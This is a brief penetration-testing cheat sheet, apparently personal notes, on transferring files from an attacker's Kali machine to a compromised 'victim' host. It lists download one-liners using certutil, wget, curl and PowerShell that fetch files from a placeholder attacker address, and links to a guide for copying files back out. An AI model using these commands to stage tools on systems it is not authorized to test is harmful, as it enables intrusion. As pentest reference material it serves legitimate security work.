# From kali to victim
On victim machine, 

```shell
# certutil
certutil.exe -urlcache -f http://<kali-ip>:<port>/<filename> <filename-to-save>

# wget
wget http://<kali-ip>:<port>/<filename>

# curl
curl http://<kali-ip>:<port>/<filename> -o <filename-to-save>

# powershell
iwr -uri http://<kali-ip>:<port>/<filename> -outfile <filename-to-save>
```

# From victim to kali
Refer to https://csbygb.gitbook.io/pentips/post-exploitation/file-transfers
Note: if face error with SCP, try using `-T` or `-O` options